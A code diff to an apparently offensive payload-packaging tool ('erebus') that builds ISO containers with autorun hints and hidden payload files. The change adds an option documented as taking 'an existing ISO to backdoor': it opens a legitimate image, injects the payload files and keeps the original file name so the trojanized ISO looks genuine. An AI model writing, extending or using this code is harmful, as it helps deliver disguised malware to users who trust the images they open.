@@ -7,6 +7,7 @@ DEFAULT_ROOT = REPO_ROOT / "agent_code"
 
 def build_iso(volume_id: str = "SYSTEM",
               enable_autorun: bool = True,
+              source_iso: pathlib.Path = None,
               build_path: pathlib.Path = None) -> pathlib.Path:
     """
     Generates an ISO container.
@@ -15,6 +16,8 @@ def build_iso(volume_id: str = "SYSTEM",
     :type volume_id: str
     :param enable_autorun: Include autorun.inf for auto-execution hints.
     :type enable_autorun: bool
+    :param source_iso: Optional Path to an existing ISO to backdoor.
+    :type source_iso: pathlib.Path
     :param build_path: The build path of the current build process.
     :type build_path: pathlib.Path
     :return: Returns Path to the generated ISO.
@@ -46,16 +49,26 @@ Icon=shell32.dll,4
             autorun_path = payload_dir / "autorun.inf"
             autorun_path.write_text(autorun_content)
         
-        archive_path = container_dir / "iso" / "erebus.iso"
+        
+        if source_iso and source_iso.exists():
+            output_name = source_iso.name
+        else:
+            output_name = "erebus.iso"
+            
+        archive_path = container_dir / "iso" / output_name
         archive_path.parent.mkdir(parents=True, exist_ok=True)
 
         iso = PyCdlib()
-        iso.new(
-            interchange_level=3,
-            joliet=3,
-            rock_ridge=None,
-            vol_ident=volume_id
-        )
+        
+        if source_iso and source_iso.exists():
+            iso.open(str(source_iso))
+        else:
+            iso.new(
+                interchange_level=3,
+                joliet=3,
+                rock_ridge=None,
+                vol_ident=volume_id
+            )
         
         files_to_hide= []
         
@@ -66,11 +79,13 @@ Icon=shell32.dll,4
             if item.is_file():
                 relative_path = item.relative_to(payload_dir)
                 iso_path = '/' + str(relative_path).replace('\\', '/')
-
+                filename_str = item.name
+                
                 iso.add_file(
                     str(item), 
                     iso_path=iso_path.upper(), 
-                    joliet_path=iso_path
+                    joliet_path=iso_path,
+                    rr_name=filename_str
                 )
                 
             if (item.suffix.lower() not in VISIBLE_EXTENSIONS):
